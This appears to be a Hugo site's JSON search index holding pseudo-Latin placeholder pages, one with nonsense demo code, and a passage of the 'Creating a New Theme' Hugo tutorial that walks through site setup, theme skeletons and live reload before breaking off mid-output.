[{"id":0,"href":"/docs/example/","title":"Example Site","section":"Docs","content":" Introduction # Ferre hinnitibus erat accipitrem dixi Troiae tollens # Lorem markdownum, a quoque nutu est quodcumque mandasset veluti. Passim inportuna totidemque nympha fert; repetens pendent, poenarum guttura sed vacet non, mortali undas. Omnis pharetramque gramen portentificisque membris servatum novabis fallit de nubibus atque silvas mihi. Dixit repetitaque Quid; verrit longa; sententia mandat quascumque nescio solebat litore; noctes. Hostem haerentem circuit plenaque tamen.\nPedum ne indigenae finire invergens carpebat Velit posses summoque De fumos illa foret Est simul fameque tauri qua ad # Locum nullus nisi vomentes. Ab Persea sermone vela, miratur aratro; eandem Argolicas gener.\nMe sol # Nec dis certa fuit socer, Nonacria dies manet tacitaque sibi? Sucis est iactata Castrumque iudex, et iactato quoque terraeque es tandem et maternos vittis. Lumina litus bene poenamque animos callem ne tuas in leones illam dea cadunt genus, et pleno nunc in quod. Anumque crescentesque sanguinis progenies nuribus rustica tinguet. Pater omnes liquido creditis noctem.\nif (mirrored(icmp_dvd_pim, 3, smbMirroredHard) != lion(clickImportQueue, viralItunesBalancing, bankruptcy_file_pptp)) { file += ip_cybercrime_suffix; } if (runtimeSmartRom == netMarketingWord) { virusBalancingWin *= scriptPromptBespoke + raster(post_drive, windowsSli); cd = address_hertz_trojan; soap_ccd.pcbServerGigahertz(asp_hardware_isa, offlinePeopleware, nui); } else { megabyte.api = modem_flowchart - web + syntaxHalftoneAddress; } if (3 \u0026lt; mebibyteNetworkAnimated) { pharming_regular_error *= jsp_ribbon + algorithm * recycleMediaKindle( dvrSyntax, cdma); adf_sla *= hoverCropDrive; templateNtfs = -1 - vertical; } else { expressionCompressionVariable.bootMulti = white_eup_javascript( table_suffix); guidPpiPram.tracerouteLinux += rtfTerabyteQuicktime(1, managementRosetta(webcamActivex), 740874); } var virusTweetSsl = nullGigo; Trepident sitimque # Sentiet et ferali errorem fessam, coercet superbus, Ascaniumque in pennis mediis; dolor? Vidit imi Aeacon perfida propositos adde, tua Somni Fluctibus errante lustrat non.\nTamen inde, vos videt e flammis Scythica parantem rupisque pectora umbras. Haec ficta canistris repercusso simul ego aris Dixit! Esse Fama trepidare hunc crescendo vigor ululasse vertice exspatiantur celer tepidique petita aversata oculis iussa est me ferro.\n"},{"id":1,"href":"/docs/example/table-of-contents/with-toc/","title":"With ToC","section":"Table of Contents","content":" Caput vino delphine in tamen vias # Cognita laeva illo fracta # Lorem markdownum pavent auras, surgit nunc cingentibus libet Laomedonque que est. Pastor An arbor filia foedat, ne fugit aliter, per. Helicona illas et callida neptem est Oresitrophos caput, dentibus est venit. Tenet reddite famuli praesentem fortibus, quaeque vis foret si frondes gelidos gravidae circumtulit inpulit armenta nativum.\nTe at cruciabere vides rubentis manebo Maturuit in praetemptat ruborem ignara postquam habitasse Subitarum supplevit quoque fontesque venabula spretis modo Montis tot est mali quasque gravis Quinquennem domus arsit ipse Pellem turis pugnabant locavit Natus quaerere # Pectora et sine mulcere, coniuge dum tincta incurvae. Quis iam; est dextra Peneosque, metuis a verba, primo. Illa sed colloque suis: magno: gramen, aera excutiunt concipit.\nPhrygiae petendo suisque extimuit, super, pars quod audet! Turba negarem. Fuerat attonitus; et dextra retinet sidera ulnas undas instimulat vacuae generis? Agnus dabat et ignotis dextera, sic tibi pacis feriente at mora euhoeque comites hostem vestras Phineus. Vultuque sanguine dominoque metuit risi fama vergit summaque meus clarissimus artesque tinguebat successor nominis cervice caelicolae.\nLimitibus misere sit # Aurea non fata repertis praerupit feruntur simul, meae hosti lentaque citius levibus, cum sede dixit, Phaethon texta. Albentibus summos multifidasque iungitur loquendi an pectore, mihi ursaque omnia adfata, aeno parvumque in animi perlucentes. Epytus agis ait vixque clamat ornum adversam spondet, quid sceptra ipsum est. Reseret nec; saeva suo passu debentia linguam terga et aures et cervix de ubera. Coercet gelidumque manus, doluit volvitur induta?\nEnim sua # Iuvenilior filia inlustre templa quidem herbis permittat trahens huic. In cruribus proceres sole crescitque fata, quos quos; merui maris se non tamen in, mea.\nGermana aves pignus tecta # Mortalia rudibusque caelum cognosceret tantum aquis redito felicior texit, nec, aris parvo acre. Me parum contulerant multi tenentem, gratissime suis; vultum tu occupat deficeret corpora, sonum. E Actaea inplevit Phinea concepit nomenque potest sanguine captam nulla et, in duxisses campis non; mercede. Dicere cur Leucothoen obitum?\nPostibus mittam est nubibus principium pluma, exsecratur facta et. Iunge Mnemonidas pallamque pars; vere restitit alis flumina quae quoque, est ignara infestus Pyrrha. Di ducis terris maculatum At sede praemia manes nullaque!\n"},{"id":2,"href":"/docs/example/table-of-contents/without-toc/","title":"Without ToC","section":"Table of Contents","content":" At me ipso nepotibus nunc celebratior genus # Tanto oblite # Lorem markdownum pectora novis patenti igne sua opus aurae feras materiaque illic demersit imago et aristas questaque posset. Vomit quoque suo inhaesuro clara. Esse cumque, per referri triste. Ut exponit solisque communis in tendens vincetis agisque iamque huic bene ante vetat omina Thebae rates. Aeacus servat admonitu concidit, ad resimas vultus et rugas vultu dignamque Siphnon.\nQuam iugulum regia simulacra, plus meruit humo pecorumque haesit, ab discedunt dixit: ritu pharetramque. Exul Laurenti orantem modo, per densum missisque labor manibus non colla unum, obiectat. Tu pervia collo, fessus quae Cretenque Myconon crate! Tegumenque quae invisi sudore per vocari quaque plus ventis fluidos. Nodo perque, fugisse pectora sorores.\nSumme promissa supple vadit lenius # Quibus largis latebris aethera versato est, ait sentiat faciemque. Aequata alis nec Caeneus exululat inclite corpus est, ire tibi ostendens et tibi. Rigent et vires dique possent lumina; eadem dixit poma funeribus paret et felix reddebant ventis utile lignum.\nRemansit notam Stygia feroxque Et dabit materna Vipereas Phrygiaeque umbram sollicito cruore conlucere suus Quarum Elis corniger Nec ieiunia dixit Vertitur mos ortu ramosam contudit dumque; placabat ac lumen. Coniunx Amoris spatium poenamque cavernis Thebae Pleiadasque ponunt, rapiare cum quae parum nimium rima.\nQuidem resupinus inducto solebat una facinus quae # Credulitas iniqua praepetibus paruit prospexit, voce poena, sub rupit sinuatur, quin suum ventorumque arcadiae priori. Soporiferam erat formamque, fecit, invergens, nymphae mutat fessas ait finge.\nBaculum mandataque ne addere capiti violentior Altera duas quam hoc ille tenues inquit Sicula sidereus latrantis domoque ratae polluit comites Possit oro clausura namque se nunc iuvenisque Faciem posuit Quodque cum ponunt novercae nata vestrae aratra Ite extrema Phrygiis, patre dentibus, tonso perculit, enim blanda, manibus fide quos caput armis, posse! Nocendo fas Alcyonae lacertis structa ferarum manus fulmen dubius, saxa caelum effuge extremis fixum tumor adfecit bella, potentes? Dum nec insidiosa tempora tegit spirarunt. Per lupi pars foliis, porreximus humum negant sunt subposuere Sidone steterant auro. Memoraverit sine: ferrum idem Orion caelum heres gerebat fixis?\n"},{"id":3,"href":"/posts/creating-a-new-theme/","title":"Creating a New Theme","section":"Blog","content":" Introduction # This tutorial will show you how to create a simple theme in Hugo. I assume that you are familiar with HTML, the bash command line, and that you are comfortable using Markdown to format content. I\u0026rsquo;ll explain how Hugo uses templates and how you can organize your templates to create a theme. I won\u0026rsquo;t cover using CSS to style your theme.\nWe\u0026rsquo;ll start with creating a new site with a very basic template. Then we\u0026rsquo;ll add in a few pages and posts. With small variations on that, you will be able to create many different types of web sites.\nIn this tutorial, commands that you enter will start with the \u0026ldquo;$\u0026rdquo; prompt. The output will follow. Lines that start with \u0026ldquo;#\u0026rdquo; are comments that I\u0026rsquo;ve added to explain a point. When I show updates to a file, the \u0026ldquo;:wq\u0026rdquo; on the last line means to save the file.\nHere\u0026rsquo;s an example:\n## this is a comment $ echo this is a command this is a command ## edit the file $ vi foo.md +++ date = \u0026#34;2014-09-28\u0026#34; title = \u0026#34;creating a new theme\u0026#34; +++ bah and humbug :wq ## show it $ cat foo.md +++ date = \u0026#34;2014-09-28\u0026#34; title = \u0026#34;creating a new theme\u0026#34; +++ bah and humbug $ Some Definitions # There are a few concepts that you need to understand before creating a theme.\nSkins # Skins are the files responsible for the look and feel of your site. It’s the CSS that controls colors and fonts, it’s the Javascript that determines actions and reactions. It’s also the rules that Hugo uses to transform your content into the HTML that the site will serve to visitors.\nYou have two ways to create a skin. The simplest way is to create it in the layouts/ directory. If you do, then you don’t have to worry about configuring Hugo to recognize it. The first place that Hugo will look for rules and files is in the layouts/ directory so it will always find the skin.\nYour second choice is to create it in a sub-directory of the themes/ directory. If you do, then you must always tell Hugo where to search for the skin. It’s extra work, though, so why bother with it?\nThe difference between creating a skin in layouts/ and creating it in themes/ is very subtle. A skin in layouts/ can’t be customized without updating the templates and static files that it is built from. A skin created in themes/, on the other hand, can be and that makes it easier for other people to use it.\nThe rest of this tutorial will call a skin created in the themes/ directory a theme.\nNote that you can use this tutorial to create a skin in the layouts/ directory if you wish to. The main difference will be that you won’t need to update the site’s configuration file to use a theme.\nThe Home Page # The home page, or landing page, is the first page that many visitors to a site see. It is the index.html file in the root directory of the web site. Since Hugo writes files to the public/ directory, our home page is public/index.html.\nSite Configuration File # When Hugo runs, it looks for a configuration file that contains settings that override default values for the entire site. The file can use TOML, YAML, or JSON. I prefer to use TOML for my configuration files. If you prefer to use JSON or YAML, you’ll need to translate my examples. You’ll also need to change the name of the file since Hugo uses the extension to determine how to process it.\nHugo translates Markdown files into HTML. By default, Hugo expects to find Markdown files in your content/ directory and template files in your themes/ directory. It will create HTML files in your public/ directory. You can change this by specifying alternate locations in the configuration file.\nContent # Content is stored in text files that contain two sections. The first section is the “front matter,” which is the meta-information on the content. The second section contains Markdown that will be converted to HTML.\nFront Matter # The front matter is information about the content. Like the configuration file, it can be written in TOML, YAML, or JSON. Unlike the configuration file, Hugo doesn’t use the file’s extension to know the format. It looks for markers to signal the type. TOML is surrounded by “+++”, YAML by “---”, and JSON is enclosed in curly braces. I prefer to use TOML, so you’ll need to translate my examples if you prefer YAML or JSON.\nThe information in the front matter is passed into the template before the content is rendered into HTML.\nMarkdown # Content is written in Markdown which makes it easier to create the content. Hugo runs the content through a Markdown engine to create the HTML which will be written to the output file.\nTemplate Files # Hugo uses template files to render content into HTML. Template files are a bridge between the content and presentation. Rules in the template define what content is published, where it\u0026rsquo;s published to, and how it will rendered to the HTML file. The template guides the presentation by specifying the style to use.\nThere are three types of templates: single, list, and partial. Each type takes a bit of content as input and transforms it based on the commands in the template.\nHugo uses its knowledge of the content to find the template file used to render the content. If it can’t find a template that is an exact match for the content, it will shift up a level and search from there. It will continue to do so until it finds a matching template or runs out of templates to try. If it can’t find a template, it will use the default template for the site.\nPlease note that you can use the front matter to influence Hugo’s choice of templates.\nSingle Template # A single template is used to render a single piece of content. For example, an article or post would be a single piece of content and use a single template.\nList Template # A list template renders a group of related content. That could be a summary of recent postings or all articles in a category. List templates can contain multiple groups.\nThe homepage template is a special type of list template. Hugo assumes that the home page of your site will act as the portal for the rest of the content in the site.\nPartial Template # A partial template is a template that can be included in other templates. Partial templates must be called using the “partial” template command. They are very handy for rolling up common behavior. For example, your site may have a banner that all pages use. Instead of copying the text of the banner into every single and list template, you could create a partial with the banner in it. That way if you decide to change the banner, you only have to change the partial template.\nCreate a New Site # Let\u0026rsquo;s use Hugo to create a new web site. I\u0026rsquo;m a Mac user, so I\u0026rsquo;ll create mine in my home directory, in the Sites folder. If you\u0026rsquo;re using Linux, you might have to create the folder first.\nThe \u0026ldquo;new site\u0026rdquo; command will create a skeleton of a site. It will give you the basic directory structure and a useable configuration file.\n$ hugo new site ~/Sites/zafta $ cd ~/Sites/zafta $ ls -l total 8 drwxr-xr-x 7 quoha staff 238 Sep 29 16:49 . drwxr-xr-x 3 quoha staff 102 Sep 29 16:49 .. drwxr-xr-x 2 quoha staff 68 Sep 29 16:49 archetypes -rw-r--r-- 1 quoha staff 82 Sep 29 16:49 config.toml drwxr-xr-x 2 quoha staff 68 Sep 29 16:49 content drwxr-xr-x 2 quoha staff 68 Sep 29 16:49 layouts drwxr-xr-x 2 quoha staff 68 Sep 29 16:49 static $ Take a look in the content/ directory to confirm that it is empty.\nThe other directories (archetypes/, layouts/, and static/) are used when customizing a theme. That\u0026rsquo;s a topic for a different tutorial, so please ignore them for now.\nGenerate the HTML For the New Site # Running the hugo command with no options will read all the available content and generate the HTML files. It will also copy all static files (that\u0026rsquo;s everything that\u0026rsquo;s not content). Since we have an empty site, it won\u0026rsquo;t do much, but it will do it very quickly.\n$ hugo --verbose INFO: 2014/09/29 Using config file: config.toml INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/static/ to /Users/quoha/Sites/zafta/public/ WARN: 2014/09/29 Unable to locate layout: [index.html _default/list.html _default/single.html] WARN: 2014/09/29 Unable to locate layout: [404.html] 0 draft content 0 future content 0 pages created 0 tags created 0 categories created in 2 ms $ The \u0026ldquo;--verbose\u0026rdquo; flag gives extra information that will be helpful when we build the template. Every line of the output that starts with \u0026ldquo;INFO:\u0026rdquo; or \u0026ldquo;WARN:\u0026rdquo; is present because we used that flag. The lines that start with \u0026ldquo;WARN:\u0026rdquo; are warning messages. We\u0026rsquo;ll go over them later.\nWe can verify that the command worked by looking at the directory again.\n$ ls -l total 8 drwxr-xr-x 2 quoha staff 68 Sep 29 16:49 archetypes -rw-r--r-- 1 quoha staff 82 Sep 29 16:49 config.toml drwxr-xr-x 2 quoha staff 68 Sep 29 16:49 content drwxr-xr-x 2 quoha staff 68 Sep 29 16:49 layouts drwxr-xr-x 4 quoha staff 136 Sep 29 17:02 public drwxr-xr-x 2 quoha staff 68 Sep 29 16:49 static $ See that new public/ directory? Hugo placed all generated content there. When you\u0026rsquo;re ready to publish your web site, that\u0026rsquo;s the place to start. For now, though, let\u0026rsquo;s just confirm that we have what we\u0026rsquo;d expect from a site with no content.\n$ ls -l public total 16 -rw-r--r-- 1 quoha staff 416 Sep 29 17:02 index.xml -rw-r--r-- 1 quoha staff 262 Sep 29 17:02 sitemap.xml $ Hugo created two XML files, which is standard, but there are no HTML files.\nTest the New Site # Verify that you can run the built-in web server. It will dramatically shorten your development cycle if you do. Start it by running the \u0026ldquo;server\u0026rdquo; command. If it is successful, you will see output similar to the following:\n$ hugo server --verbose INFO: 2014/09/29 Using config file: /Users/quoha/Sites/zafta/config.toml INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/static/ to /Users/quoha/Sites/zafta/public/ WARN: 2014/09/29 Unable to locate layout: [index.html _default/list.html _default/single.html] WARN: 2014/09/29 Unable to locate layout: [404.html] 0 draft content 0 future content 0 pages created 0 tags created 0 categories created in 2 ms Serving pages from /Users/quoha/Sites/zafta/public Web Server is available at http://localhost:1313 Press Ctrl+C to stop Connect to the listed URL (it\u0026rsquo;s on the line that starts with \u0026ldquo;Web Server\u0026rdquo;). If everything is working correctly, you should get a page that shows the following:\nindex.xml sitemap.xml That\u0026rsquo;s a listing of your public/ directory. Hugo didn\u0026rsquo;t create a home page because our site has no content. When there\u0026rsquo;s no index.html file in a directory, the server lists the files in the directory, which is what you should see in your browser.\nLet’s go back and look at those warnings again.\nWARN: 2014/09/29 Unable to locate layout: [index.html _default/list.html _default/single.html] WARN: 2014/09/29 Unable to locate layout: [404.html] That second warning is easier to explain. We haven’t created a template to be used to generate “page not found errors.” The 404 message is a topic for a separate tutorial.\nNow for the first warning. It is for the home page. You can tell because the first layout that it looked for was “index.html.” That’s only used by the home page.\nI like that the verbose flag causes Hugo to list the files that it\u0026rsquo;s searching for. For the home page, they are index.html, _default/list.html, and _default/single.html. There are some rules that we\u0026rsquo;ll cover later that explain the names and paths. For now, just remember that Hugo couldn\u0026rsquo;t find a template for the home page and it told you so.\nAt this point, you\u0026rsquo;ve got a working installation and site that we can build upon. All that’s left is to add some content and a theme to display it.\nCreate a New Theme # Hugo doesn\u0026rsquo;t ship with a default theme. There are a few available (I counted a dozen when I first installed Hugo) and Hugo comes with a command to create new themes.\nWe\u0026rsquo;re going to create a new theme called \u0026ldquo;zafta.\u0026rdquo; Since the goal of this tutorial is to show you how to fill out the files to pull in your content, the theme will not contain any CSS. In other words, ugly but functional.\nAll themes have opinions on content and layout. For example, Zafta uses \u0026ldquo;post\u0026rdquo; over \u0026ldquo;blog\u0026rdquo;. Strong opinions make for simpler templates but differing opinions make it tougher to use themes. When you build a theme, consider using the terms that other themes do.\nCreate a Skeleton # Use the hugo \u0026ldquo;new\u0026rdquo; command to create the skeleton of a theme. This creates the directory structure and places empty files for you to fill out.\n$ hugo new theme zafta $ ls -l total 8 drwxr-xr-x 2 quoha staff 68 Sep 29 16:49 archetypes -rw-r--r-- 1 quoha staff 82 Sep 29 16:49 config.toml drwxr-xr-x 2 quoha staff 68 Sep 29 16:49 content drwxr-xr-x 2 quoha staff 68 Sep 29 16:49 layouts drwxr-xr-x 4 quoha staff 136 Sep 29 17:02 public drwxr-xr-x 2 quoha staff 68 Sep 29 16:49 static drwxr-xr-x 3 quoha staff 102 Sep 29 17:31 themes $ find themes -type f | xargs ls -l -rw-r--r-- 1 quoha staff 1081 Sep 29 17:31 themes/zafta/LICENSE.md -rw-r--r-- 1 quoha staff 0 Sep 29 17:31 themes/zafta/archetypes/default.md -rw-r--r-- 1 quoha staff 0 Sep 29 17:31 themes/zafta/layouts/_default/list.html -rw-r--r-- 1 quoha staff 0 Sep 29 17:31 themes/zafta/layouts/_default/single.html -rw-r--r-- 1 quoha staff 0 Sep 29 17:31 themes/zafta/layouts/index.html -rw-r--r-- 1 quoha staff 0 Sep 29 17:31 themes/zafta/layouts/partials/footer.html -rw-r--r-- 1 quoha staff 0 Sep 29 17:31 themes/zafta/layouts/partials/header.html -rw-r--r-- 1 quoha staff 93 Sep 29 17:31 themes/zafta/theme.toml $ The skeleton includes templates (the files ending in .html), license file, a description of your theme (the theme.toml file), and an empty archetype.\nPlease take a minute to fill out the theme.toml and LICENSE.md files. They\u0026rsquo;re optional, but if you\u0026rsquo;re going to be distributing your theme, it tells the world who to praise (or blame). It\u0026rsquo;s also nice to declare the license so that people will know how they can use the theme.\n$ vi themes/zafta/theme.toml author = \u0026#34;michael d henderson\u0026#34; description = \u0026#34;a minimal working template\u0026#34; license = \u0026#34;MIT\u0026#34; name = \u0026#34;zafta\u0026#34; source_repo = \u0026#34;\u0026#34; tags = [\u0026#34;tags\u0026#34;, \u0026#34;categories\u0026#34;] :wq ## also edit themes/zafta/LICENSE.md and change ## the bit that says \u0026#34;YOUR_NAME_HERE\u0026#34; Note that the the skeleton\u0026rsquo;s template files are empty. Don\u0026rsquo;t worry, we\u0026rsquo;ll be changing that shortly.\n$ find themes/zafta -name \u0026#39;*.html\u0026#39; | xargs ls -l -rw-r--r-- 1 quoha staff 0 Sep 29 17:31 themes/zafta/layouts/_default/list.html -rw-r--r-- 1 quoha staff 0 Sep 29 17:31 themes/zafta/layouts/_default/single.html -rw-r--r-- 1 quoha staff 0 Sep 29 17:31 themes/zafta/layouts/index.html -rw-r--r-- 1 quoha staff 0 Sep 29 17:31 themes/zafta/layouts/partials/footer.html -rw-r--r-- 1 quoha staff 0 Sep 29 17:31 themes/zafta/layouts/partials/header.html $ Update the Configuration File to Use the Theme # Now that we\u0026rsquo;ve got a theme to work with, it\u0026rsquo;s a good idea to add the theme name to the configuration file. This is optional, because you can always add \u0026ldquo;-t zafta\u0026rdquo; on all your commands. I like to put it the configuration file because I like shorter command lines. If you don\u0026rsquo;t put it in the configuration file or specify it on the command line, you won\u0026rsquo;t use the template that you\u0026rsquo;re expecting to.\nEdit the file to add the theme, add a title for the site, and specify that all of our content will use the TOML format.\n$ vi config.toml theme = \u0026#34;zafta\u0026#34; baseurl = \u0026#34;\u0026#34; languageCode = \u0026#34;en-us\u0026#34; title = \u0026#34;zafta - totally refreshing\u0026#34; MetaDataFormat = \u0026#34;toml\u0026#34; :wq $ Generate the Site # Now that we have an empty theme, let\u0026rsquo;s generate the site again.\n$ hugo --verbose INFO: 2014/09/29 Using config file: /Users/quoha/Sites/zafta/config.toml INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/themes/zafta/static/ to /Users/quoha/Sites/zafta/public/ INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/static/ to /Users/quoha/Sites/zafta/public/ WARN: 2014/09/29 Unable to locate layout: [404.html theme/404.html] 0 draft content 0 future content 0 pages created 0 tags created 0 categories created in 2 ms $ Did you notice that the output is different? The warning message for the home page has disappeared and we have an additional information line saying that Hugo is syncing from the theme\u0026rsquo;s directory.\nLet\u0026rsquo;s check the public/ directory to see what Hugo\u0026rsquo;s created.\n$ ls -l public total 16 drwxr-xr-x 2 quoha staff 68 Sep 29 17:56 css -rw-r--r-- 1 quoha staff 0 Sep 29 17:56 index.html -rw-r--r-- 1 quoha staff 407 Sep 29 17:56 index.xml drwxr-xr-x 2 quoha staff 68 Sep 29 17:56 js -rw-r--r-- 1 quoha staff 243 Sep 29 17:56 sitemap.xml $ Notice four things:\nHugo created a home page. This is the file public/index.html. Hugo created a css/ directory. Hugo created a js/ directory. Hugo claimed that it created 0 pages. It created a file and copied over static files, but didn\u0026rsquo;t create any pages. That\u0026rsquo;s because it considers a \u0026ldquo;page\u0026rdquo; to be a file created directly from a content file. It doesn\u0026rsquo;t count things like the index.html files that it creates automatically. The Home Page # Hugo supports many different types of templates. The home page is special because it gets its own type of template and its own template file. The file, layouts/index.html, is used to generate the HTML for the home page. The Hugo documentation says that this is the only required template, but that depends. Hugo\u0026rsquo;s warning message shows that it looks for three different templates:\nWARN: 2014/09/29 Unable to locate layout: [index.html _default/list.html _default/single.html] If it can\u0026rsquo;t find any of these, it completely skips creating the home page. We noticed that when we built the site without having a theme installed.\nWhen Hugo created our theme, it created an empty home page template. Now, when we build the site, Hugo finds the template and uses it to generate the HTML for the home page. Since the template file is empty, the HTML file is empty, too. If the template had any rules in it, then Hugo would have used them to generate the home page.\n$ find . -name index.html | xargs ls -l -rw-r--r-- 1 quoha staff 0 Sep 29 20:21 ./public/index.html -rw-r--r-- 1 quoha staff 0 Sep 29 17:31 ./themes/zafta/layouts/index.html $ The Magic of Static # Hugo does two things when generating the site. It uses templates to transform content into HTML and it copies static files into the site. Unlike content, static files are not transformed. They are copied exactly as they are.\nHugo assumes that your site will use both CSS and JavaScript, so it creates directories in your theme to hold them. Remember opinions? Well, Hugo\u0026rsquo;s opinion is that you\u0026rsquo;ll store your CSS in a directory named css/ and your JavaScript in a directory named js/. If you don\u0026rsquo;t like that, you can change the directory names in your theme directory or even delete them completely. Hugo\u0026rsquo;s nice enough to offer its opinion, then behave nicely if you disagree.\n$ find themes/zafta -type d | xargs ls -ld drwxr-xr-x 7 quoha staff 238 Sep 29 17:38 themes/zafta drwxr-xr-x 3 quoha staff 102 Sep 29 17:31 themes/zafta/archetypes drwxr-xr-x 5 quoha staff 170 Sep 29 17:31 themes/zafta/layouts drwxr-xr-x 4 quoha staff 136 Sep 29 17:31 themes/zafta/layouts/_default drwxr-xr-x 4 quoha staff 136 Sep 29 17:31 themes/zafta/layouts/partials drwxr-xr-x 4 quoha staff 136 Sep 29 17:31 themes/zafta/static drwxr-xr-x 2 quoha staff 68 Sep 29 17:31 themes/zafta/static/css drwxr-xr-x 2 quoha staff 68 Sep 29 17:31 themes/zafta/static/js $ The Theme Development Cycle # When you\u0026rsquo;re working on a theme, you will make changes in the theme\u0026rsquo;s directory, rebuild the site, and check your changes in the browser. Hugo makes this very easy:\nPurge the public/ directory. Run the built in web server in watch mode. Open your site in a browser. Update the theme. Glance at your browser window to see changes. Return to step 4. I’ll throw in one more opinion: never work on a theme on a live site. Always work on a copy of your site. Make changes to your theme, test them, then copy them up to your site. For added safety, use a tool like Git to keep a revision history of your content and your theme. Believe me when I say that it is too easy to lose both your mind and your changes.\nCheck the main Hugo site for information on using Git with Hugo.\nPurge the public/ Directory # When generating the site, Hugo will create new files and update existing ones in the public/ directory. It will not delete files that are no longer used. For example, files that were created in the wrong directory or with the wrong title will remain. If you leave them, you might get confused by them later. I recommend cleaning out your site prior to generating it.\nNote: If you\u0026rsquo;re building on an SSD, you should ignore this. Churning on a SSD can be costly.\nHugo\u0026rsquo;s Watch Option # Hugo\u0026rsquo;s \u0026ldquo;--watch\u0026rdquo; option will monitor the content/ and your theme directories for changes and rebuild the site automatically.\nLive Reload # Hugo\u0026rsquo;s built in web server supports live reload. As pages are saved on the server, the browser is told to refresh the page. Usually, this happens faster than you can say, \u0026ldquo;Wow, that\u0026rsquo;s totally amazing.\u0026rdquo;\nDevelopment Commands # Use the following commands as the basis for your workflow.\n## purge old files. hugo will recreate the public directory. ## $ rm -rf public ## ## run hugo in watch mode ## $ hugo server --watch --verbose Here\u0026rsquo;s sample output showing Hugo detecting a change to the template for the home page. Once generated, the web browser automatically reloaded the page. I\u0026rsquo;ve said this before, it\u0026rsquo;s amazing.\n$ rm -rf public $ hugo server --watch --verbose INFO: 2014/09/29 Using config file: /Users/quoha/Sites/zafta/config.toml INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/themes/zafta/static/ to /Users/quoha/Sites/zafta/public/ INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/static/ to /Users/quoha/Sites/zafta/public/ WARN: 2014/09/29 Unable to locate layout: [404.html theme/404.html] 0 draft content 0 future content 0 pages created 0 tags created 0 categories created in 2 ms Watching for changes in /Users/quoha/Sites/zafta/content Serving pages from /Users/quoha/Sites/zafta/public Web Server is available at http://localhost:1313 Press Ctrl+C to stop INFO: 2014/09/29 File System Event: [\u0026#34;/Users/quoha/Sites/zafta/themes/zafta/layouts/index.html\u0026#34;: MODIFY|ATTRIB] Change detected, rebuilding site WARN: 2014/09/29 Unable to locate layout: [404.html theme/404.html] 0 draft content 0 future content 0 pages created 0 tags created 0 categories created in 1 ms Update the Home Page Template # The home page is one of a few special pages that Hugo creates automatically. As mentioned earlier, it looks for one of three files in the theme\u0026rsquo;s layout/ directory:\nindex.html _default/list.html _default/single.html We could update one of the default templates, but a good design decision is to update the most specific template available. That\u0026rsquo;s not a hard and fast rule (in fact, we\u0026rsquo;ll break it a few times in this tutorial), but it is a good generalization.\nMake a Static Home Page # Right now, that page is empty because we don\u0026rsquo;t have any content and we don\u0026rsquo;t have any logic in the template. Let\u0026rsquo;s change that by adding some text to the template.\n$ vi themes/zafta/layouts/index.html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;hugo says hello!\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; :wq $ Build the web site and then verify the results.\n$ hugo --verbose INFO: 2014/09/29 Using config file: /Users/quoha/Sites/zafta/config.toml INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/themes/zafta/static/ to /Users/quoha/Sites/zafta/public/ INFO: 2014/09/29 syncing from /Users/quoha/Sites/zafta/static/ to /Users/quoha/Sites/zafta/public/ WARN: 2014/09/29 Unable to locate layout: [404.html theme/404.html] 0 draft content 0 future content 0 pages created 0 tags created 0 categories created in 2 ms $ find public -type f -name \u0026#39;*.html\u0026#39; | xargs ls -l -rw-r--r-- 1 quoha staff 78 Sep 29 21:26 public/index.html $ cat public/index.html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;hugo says hello!\u0026lt;/p\u0026gt; \u0026lt;/html\u0026gt; Live Reload # Note: If you\u0026rsquo;re running the server with the --watch option, you\u0026rsquo;ll see different content in the file:\n$ cat public/index.html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;hugo says hello!\u0026lt;/p\u0026gt; \u0026lt;script\u0026gt;document.write(\u0026#39;\u0026lt;script src=\u0026#34;http://\u0026#39; + (location.host || \u0026#39;localhost\u0026#39;).split(\u0026#39;:\u0026#39;)[0] + \u0026#39;:1313/livereload.js?mindelay=10\u0026#34;\u0026gt;\u0026lt;/\u0026#39; + \u0026#39;script\u0026gt;\u0026#39;)\u0026lt;/script\u0026gt;\u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; When you use --watch, the Live Reload script is added by Hugo. Look for live reload in the documentation to see what it does and how to disable it.\nBuild a \u0026ldquo;Dynamic\u0026rdquo; Home Page # \u0026ldquo;Dynamic home page?\u0026rdquo; Hugo\u0026rsquo;s a static web site generator, so this seems an odd thing to say. I mean let\u0026rsquo;s have the home page automatically reflect the content in the site every time Hugo builds it. We\u0026rsquo;ll use iteration in the template to do that.\nCreate New Posts # Now that we have the home page generating static content, let\u0026rsquo;s add some content to the site. We\u0026rsquo;ll display these posts as a list on the home page and on their own page, too.\nHugo has a command to generate a skeleton post, just like it does for sites and themes.\n$ hugo --verbose new post/first.md INFO: 2014/09/29 Using config file: /Users/quoha/Sites/zafta/config.toml INFO: 2014/09/29 attempting to create post/first.md of post INFO: 2014/09/29 curpath: /Users/quoha/Sites/zafta/themes/zafta/archetypes/default.md ERROR: 2014/09/29 Unable to Cast \u0026lt;nil\u0026gt; to map[string]interface{} $ That wasn\u0026rsquo;t very nice, was it?\nThe \u0026ldquo;new\u0026rdquo; command uses an archetype to create the post file. Hugo created an empty default archetype file, but that causes an error when there\u0026rsquo;s a theme. For me, the workaround was to create an archetypes file specifically for the post type.\n$ vi themes/zafta/archetypes/post.md +++ Description = \u0026#34;\u0026#34; Tags = [] Categories = [] +++ :wq $ find themes/zafta/archetypes -type f | xargs ls -l -rw-r--r-- 1 quoha staff 0 Sep 29 21:53 themes/zafta/archetypes/default.md -rw-r--r-- 1 quoha staff 51 Sep 29 21:54 themes/zafta/archetypes/post.md $ hugo --verbose new post/first.md INFO: 2014/09/29 Using config file: /Users/quoha/Sites/zafta/config.toml INFO: 2014/09/29 attempting to create post/first.md of post INFO: 2014/09/29 curpath: 